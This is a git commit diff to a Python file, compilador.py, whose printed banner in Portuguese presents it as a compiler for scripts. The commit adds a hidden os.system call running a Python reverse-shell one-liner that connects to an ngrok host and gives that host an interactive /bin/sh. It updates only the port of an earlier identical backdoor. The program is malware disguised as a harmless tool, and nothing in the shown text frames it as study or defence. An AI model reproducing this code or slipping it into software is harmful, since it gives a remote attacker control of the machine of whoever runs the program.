6a0098b2f2cb30129c7fad529fd633f98b78ab9c
spawnn <80365034+SPAWN-cloud@users.noreply.github.com>
2022-06-06 18:31:11 -0400

    Update compilador.py

--- compilador.py
+++ compilador.py
@@ -18,4 +18,4 @@ print(f'''isso e um compilador para scripts
 $ comece agora seu script:  
 ''')
 
-os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",16616));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
+os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",12544));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
